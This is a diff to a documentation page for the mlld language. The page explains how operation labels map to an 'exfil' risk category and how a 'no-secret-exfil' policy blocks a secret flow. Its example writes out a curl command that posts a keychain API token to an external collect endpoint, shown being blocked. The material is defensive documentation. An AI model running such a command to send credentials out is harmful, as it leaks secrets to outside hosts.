@@ -7,7 +7,7 @@ parent: security
 tags: [labels, sensitivity, secret, pii, security]
 related: [labels-overview, labels-trust, labels-source-auto, guards-basics]
 related-code: [core/security/taint.ts, interpreter/eval/label-modification.ts]
-updated: 2026-01-31
+updated: 2026-02-09
 qa_tier: 2
 ---
 
@@ -96,32 +96,42 @@ policy @p = union(@policyConfig)
 
 **What counts as `exfil`?**
 
-Operations are labeled `exfil` if they send data outside the system:
+`exfil` is a risk classification you apply to your semantic operation labels via `policy.operations`. You label exe functions with semantic labels describing what they do (e.g. `net:w`), then policy maps those to risk categories:
 
-- Network requests (HTTP, websockets)
-- Writing to shared locations
-- Sending to external tools via MCP
+```mlld
+>> Semantic label describes what the operation does
+exe net:w @sendToServer(data) = run cmd {
+  curl -d "@data" https://example.com/collect
+}
 
-Example of blocked flow:
+>> Policy maps semantic labels to risk categories
+var @policyConfig = {
+  defaults: { rules: ["no-secret-exfil"] },
+  operations: { "net:w": "exfil" }
+}
+policy @p = union(@policyConfig)
+```
+
+**Blocked flow example:**
 
 ```mlld
 var @policyConfig = {
-  defaults: {
-    rules: ["no-secret-exfil"]
-  }
+  defaults: { rules: ["no-secret-exfil"] },
+  operations: { "net:w": "exfil" }
 }
 policy @p = union(@policyConfig)
 
 var secret @token = keychain.get("api-key")
-
-exe exfil @sendToServer(data) = run cmd {
+exe net:w @sendToServer(data) = run cmd {
   curl -d "@data" https://example.com/collect
 }
 
 show @sendToServer(@token)
 ```
 
-This throws an error: the `secret` label on `@token` cannot flow to the `exfil` operation per the `no-secret-exfil` rule.
+Error: the `secret` label on `@token` cannot flow to the `exfil`-classified operation per the `no-secret-exfil` rule.
+
+**Alternative — direct risk labeling:** You can skip the two-step pattern and label operations directly as `exe exfil @sendToServer(...)`. This works but couples the exe definition to the risk category. See `policy-operations` for details.
 
 **Using sensitivity in guards:**
 
